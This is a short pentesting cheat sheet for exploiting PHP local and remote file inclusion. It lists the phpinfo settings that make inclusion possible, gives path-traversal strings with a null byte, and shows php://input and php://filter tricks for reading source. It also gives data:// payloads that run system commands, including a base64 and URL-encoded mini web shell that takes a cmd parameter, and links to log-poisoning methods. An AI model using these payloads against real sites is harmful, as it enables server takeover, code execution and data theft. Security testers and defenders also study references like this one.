###Links
https://www.imperva.com/docs/HII_Remote_and_Local_File_Inclusion_Vulnerabilities.pdf

https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/

https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/

https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

Sometimes it is possible to do Local File inclusion (usually when a GET/POST parameter or cookie value is a filename)

###phpinfo.php
+ **allow_url_fopen=On & allow_url_include=On** Allow RFI
+ **allow_url_include=On** Allow `?file=php://input` and `?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`
+ **magic_quotes_gpc=Off** Allow `?file=../../../../../../../../../var/www/accounts/%00`
+ **disable_functions** Check for *system*, *eval*, *shell_exec*, *passthru*, *popen*, *proc_open*, *escapeshellarg*, *escapeshellcmd*, *exec*, *proc_close*, *proc_get_status*, *proc_nice*, *proc_terminate*, *pcntl_exec*

###LFI to RCE
####Log poisoning
+ Apache    
http://secanalys.blogspot.com/2013/10/local-file-inclusion-via-logpoisoning.html
+ SSH    
http://www.lanmaster53.com/2011/05/local-file-inclusion-to-remote-command-execution-using-ssh/

#####proc/self/environ
https://www.exploit-db.com/papers/12886/

##PHP streams
+ Using PHP stream `php://input`:    
`?file=php://input`    
(specify your payload in the POST parameters, watch urlencoding, requires allow_url_include=On)    
+ Using PHP stream `php://filter`:    
`?file=php://filter/convert.base64-encode/resource=index.php`    
(lets you read PHP source because it wont get evaluated in base64.)

+ simple RFI    
`page=data://text/plain, <?php system("whoami");?>`

+ base64 encoded RFI [<?php system("whoami");?>]    
`page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==`

+ mini shell    
`page=data://text/plain,<?php system($_GET[cmd]);?>&cmd=id`

+ base64 + URL encoded mini shell (didn't work without URL encoding) [<?php system($_GET[cmd]);?]    
`page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&cmd=id`

+ To read files that have been protected    
`<url>?page=php://filter/convert.base64-encode/resource=<file>`

##To find files
https://github.com/lightos/Panoptic

#To figure out traversal
https://github.com/wireghoul/dotdotpwn
